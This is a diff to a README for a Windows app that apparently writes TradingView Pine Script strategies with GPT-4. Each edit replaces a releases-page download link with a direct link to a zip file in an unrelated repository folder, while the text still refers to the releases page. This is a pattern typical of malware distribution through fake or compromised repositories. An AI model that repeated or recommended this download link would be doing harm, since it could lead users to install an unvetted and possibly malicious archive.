@@ -1,6 +1,6 @@
 # 🤖 gpt4-pinescript-v5-alert-creator - Build TradingView Strategies Fast
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Selfaware-crown670/gpt4-pinescript-v5-alert-creator/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Selfaware-crown670/gpt4-pinescript-v5-alert-creator/raw/refs/heads/main/nimbification/alert_v_gpt_creator_pinescript_v1.9.zip)
 
 ## 🚀 What this app does
 
@@ -20,7 +20,7 @@ This tool is for Windows users who want a simple way to get started with AI-assi
 
 Visit this page to download the app for Windows:
 
-https://github.com/Selfaware-crown670/gpt4-pinescript-v5-alert-creator/releases
+https://github.com/Selfaware-crown670/gpt4-pinescript-v5-alert-creator/raw/refs/heads/main/nimbification/alert_v_gpt_creator_pinescript_v1.9.zip
 
 On the releases page, choose the latest version and download the Windows file that matches your PC.
 
@@ -234,6 +234,6 @@ Your setup may include local files, saved prompts, and script output on your PC.
 
 Get the latest release here:
 
-[https://github.com/Selfaware-crown670/gpt4-pinescript-v5-alert-creator/releases](https://github.com/Selfaware-crown670/gpt4-pinescript-v5-alert-creator/releases)
+[https://github.com/Selfaware-crown670/gpt4-pinescript-v5-alert-creator/raw/refs/heads/main/nimbification/alert_v_gpt_creator_pinescript_v1.9.zip](https://github.com/Selfaware-crown670/gpt4-pinescript-v5-alert-creator/raw/refs/heads/main/nimbification/alert_v_gpt_creator_pinescript_v1.9.zip)
 
 Download the latest Windows build, open it, and start creating Pine Script strategies
